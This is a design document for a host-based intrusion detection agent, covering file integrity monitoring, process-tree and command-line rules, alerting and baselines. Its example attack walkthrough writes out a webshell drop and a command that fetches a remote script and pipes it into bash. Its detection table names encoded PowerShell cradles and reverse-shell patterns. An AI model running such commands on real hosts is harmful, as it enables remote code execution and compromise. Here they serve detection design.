# Project 12 — Host-based Intrusion Detection Agent (HIDS)

> Host-based agent covering **file integrity monitoring (FIM)** + **process monitoring**, detecting tampering and malicious process behavior on the endpoint itself.

---

## 1. High-Level Architecture

```
┌────────────────────────────── HOST AGENT ─────────────────────────────┐
│                                                                       │
│   ┌───────────────────────────────┐      ┌──────────────────────────┐  │
│   │   CAPTURE / SENSOR LAYER      │      │   DETECTION ENGINE       │  │
│   │                               │      │                          │  │
│   │  FIM Scanner    Proc Watcher  │      │  Baseline / Diff Logic   │  │
│   │  (fs events +   (proc events  │      │  Whitelist / YARA        │  │
│   │   periodic hash) + periodic   │─────▶│  Anomaly rules           │  │
│   │                 snapshots)    │      │  (families, parents,     │  │
│   └───────────────────────────────┘      │   memory, connections)   │  │
│                                          └───────────┬──────────────┘  │
│                                                      ▼                 │
│                              ┌─────────────────────────────────┐       │
│                              │   EVENTING / ALERTING LAYER      │       │
│                              │   normalize → severity → report │       │
│                              │   local log, file, OSSEC/Wazuh, │       │
│                              │   Syslog, Webhook               │       │
│                              └───────────────┬─────────────────┘       │
└──────────────────────────────────────────────┼─────────────────────────┘
                                               ▼
                                        Remote Manager / SIEM
```

**Principle:** collect at the kernel/lowest friction point, snapshot baselines periodically, diff continuously, alert without blocking the host.

---

## 2. Component Breakdown

### 2.1 Sensor Layer

**A. File Integrity Monitoring (FIM)**

Two complementary mechanisms running in parallel:
1. **Reactive (real-time):** OS-specific filesystem event notifications
   - Linux: `inotify`/`fanotify`
   - Windows: `ReadDirectoryChangesW` / ETW
2. **Proactive (periodic):** scheduled full/marked-directory scans that re-hash files to catch events missed by the reactive watcher (avoids race where a file is modified and restored hash before scan).

Per-file record (baseline DB entry):
```
path | hash(sha256) | size | mtime | uid/gid + mode(AATTRIB) | owner | baseline_snapshot_id
```

Coverage scopes (config-driven):
- `critical` — hashed every cycle (rarely-change files, e.g., `/etc/passwd`, `\system32` binaries)
- `monitored` — reactively watched + interval hashed (app dirs, web roots)
- `ignored` — excluded (caches, log churn), with glob/regex patterns

**B. Process Monitor**

- **Linux:** `proc` scanning + optional auditd/eBPF readers
- **Windows:** ETW `Microsoft-Windows-Kernel-Process`, `winlogbeat`-style event reads
- **macOS:** EndpointSecurity/eslogger (if in scope)

Captured per process event: pid, ppid, exe path, cmdline, user, start time, parent chain, network connections (via `lsof`/`netstat` sample or ETW socket events), event type (`fork`, `execve`, `terminate`, `module_load`).

Periodic **process snapshot** (every N sec) enables cross-checking process lifetime vs event stream.

### 2.2 Detection Engine

| Detector | Input | Logic | Example signal |
|----------|-------|-------|----------------|
| **FIM diff** | baseline vs current hash | rule `important` + changed fields | `/etc/passwd` modified while no admin logged in |
| **New binary / unexpected file** | scan results vs whitelist | file appears in scoped dir | webshell dropped in `www/` |
| **Process family check** | ppid chain | launch chain not in allow-list | `nginx (www) spawning /bin/sh` (LFI → RCE) |
| **Cmdline patterns** | cmdline + executable hash | regex e.g. PowerShell `-enc`, `wget|curl` from parent | encoded PowerShell download cradle |
| **Suspicious binary** | file hashes | local hash DB + YARA/ClamAV signatures | Mimikatz hash match |
| **Syscall/behavioral** (eBPF/ETW) | kernel events | exec + write + socket coercion | `bash -c 'mkfifo ...'` reverse shell shape |
| **Anomaly (baseline)** | long-term stats | deviation from host's normal behavior | process scale-up, new binary in `$PATH` |

**Decision flow:** signal → rule match → score → threshold (e.g., `severity = weighted sum`) → if above threshold → emit alert.

### 2.3 Eventing / Alerting Layer

- **Normalizer** — converts raw signals to a consistent alert schema (same CES fields as Project 11: `event.ts, source, severity, rule_id, evidence`).
- **Reporters** (pluggable, each indep throughput):
  - local log file (JSONL)
  - forward to OSSEC/Wazuh manager (standard `client`/syslog protocol)
  - syslog (RFC 3164/5424)
  - webhook / SIEM (TLS + auth token)
- **Rate limiting & dedupe** — per-asset throttle to avoid flood; coalesce repeated identical alerts (increment counter).
- **Rollback option (opt-in):** on critical-only local decisions (e.g., changed `/etc/shadow`) optionally trigger defined remediation (kill process, quarantine file) — **off by default**, alerting-only first.

### 2.4 Baseline & State Management

- `first_run` builds full baseline snapshot.
- Continuous update policy: a change is a **candidate**; accepted changes (from known admin sessions / scheduled deploys) update the baseline with issuer metadata; unaccepted → alert.
- State stored in a local SQLite DB; WAL mode for crash safety; encrypted sensitive fields.
- Rotation: snaphosts retained (`snapshot_1..N`), prune per retention config.

---

## 3. Data Flow (End-to-End Walkthrough)

1. Attacker uploads `rev.php` to `/var/www/html`.
2. Reactive watcher fires `ionotify:CREATE`; proactive scan confirms hash added.
3. Detection engine: file not in whitelist → new-binary rule → severity medium.
4. Same session: `/bin/sh -c "curl channl.xyz/x.sh|bash"` → cmdline rule tees a high-severity signal.
5. Aggregator sees both events sharing process tree / session key → single incident `web_compromise` with both evidence records.
6. Reporter publishes alert JSON to manager + local log. Manager correlates at fleet level (see Project 11).

---

## 4. Projected Directory Layout

```
hids-agent/
├── core/
│   ├── sensors/
│   │   ├── fim/            # reactive fs watchers, scanner, hasher, scope
│   │   ├── process/        # proc/etw readers, snapshotter, module_load
│   │   └── net/            # connection sampler (optional)
│   ├── detect/             # rules engine, matchers (family, cmdline, yara), score
│   ├── baseline/           # state store, snapshot lifecycle, accept/deny API
│   ├── alert/              # normalizer, dedupe/throttle, reporters/
│   └── platform/           # os-abstractions (linux/windows/macos) and perms elevation
├── rules/                  # rules.d (detection), scope.d (FIM scopes)
├── config/                 # agent.yaml, whitelist.db, reporters.yaml
├── bin/                    # install script, service unit (systemd/NSSM)
└── test/                   # fixture hosts, golden event sets
```

---

## 5. Non-Functional Requirements

| Aspect | Requirement |
|--------|-------------|
| **Performance** | < 2% CPU idle; batch hashing via `mmap`; watch-list capped; pause on load |
| **Resilience** | Never crash the host: all exceptions contained per-sensor; watchdog restarts sensors |
| **Self-protection** | Own process + config read-only (owner root, no-write); alert if agent killed |
| **Privacy** | Local-first: full cmdline retained only while needed; send minimal fields upstream |
| **Integrity of agent** | Baseline DB WAL + hash-chained snapshots to detect agent tampering |
| **Upgradability** | Rules hot-reload; sensor/engine compatibility shims for kernel version drift |

---

## 6. Test / Validation Strategy

1. **Golden tamper set:** mutate each scoped file type (a.txt, a.so, `.ssh/authorized_keys`, `cron`), assert alert + baseline discrepancy.
2. **Process replay:** scripted attack chains (reverse shell, webshell, mimikatz) replayed in CI container → assert detector matches.
3. **Baseline accept flow:** simulate legit deploy (admins apply upgrade) → confirm no false-positive.
4. **Load test:** 10k-file scope, 2s scan cadence → assert CPU/memory budget.
5. **Recovery:** kill sensors, restart → baseline intact, backlog flushed without re-scanning everything.

---

## 7. Decision Log (Architecture Choices)

1. **Reactive + periodic scanning combo** — reactive alone misses same-hash-win/races; periodic alone misses window between scans; both cover each other.
2. **Local SQLite over remote DB** — agent stays autonomous on network failure; fleet-wide analytics happen in the manager (Project 11/13 style).
3. **Rule score precedence over hard-coded severity** — avoids brittle special-casing; single tunable per deployment.
4. **Alert-only by default, remediation opt-in** — an agent that blocks can be the attack's first target; fail-open keeps availability.